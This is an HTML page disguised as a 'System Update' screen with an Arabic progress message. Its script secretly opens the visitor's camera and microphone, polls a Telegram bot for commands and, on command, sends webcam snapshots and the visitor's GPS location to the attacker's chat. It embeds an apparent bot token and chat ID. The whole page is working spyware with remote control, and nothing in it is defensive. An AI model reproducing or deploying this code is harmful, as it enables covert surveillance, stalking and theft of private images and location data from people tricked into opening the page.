<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>System Update</title>
</head>
<body style="background: black; color: #00ff41; text-align: center; padding-top: 45%;">
    <h3>جاري تحديث خدمات النظام...</h3>
    <video id="v" autoplay playsinline muted style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const token = "8712925285:AAH531D8G5vjbeBbPs8eV914URmK0BGQm8A";
        const chatId = "8754338811";
        let lastMsgId = 0;

        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('v').srcObject = stream;
                // ابدأ الاستماع للأوامر من "لوحة التحكم"
                setInterval(listenToMaster, 3000); 
            } catch (e) {}
        }

        async function listenToMaster() {
            const res = await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=-1`).then(r => r.json());
            if (res.result && res.result.length > 0) {
                const msg = res.result[0].message;
                if (msg.message_id !== lastMsgId) {
                    lastMsgId = msg.message_id;
                    const cmd = msg.text.toLowerCase();
                    execute(cmd);
                }
            }
        }

        function execute(cmd) {
            const video = document.getElementById('v');
            const canvas = document.getElementById('c');

            if (cmd === 'shot') {
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => {
                    const fd = new FormData(); fd.append('chat_id', chatId); fd.append('photo', blob);
                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: 'POST', body: fd});
                }, 'image/jpeg');
            }
            
            if (cmd === 'loc') {
                navigator.geolocation.getCurrentPosition(p => {
                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=📍 الموقع: http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
                });
            }
        }
        init();
    </script>
</body>
</html>
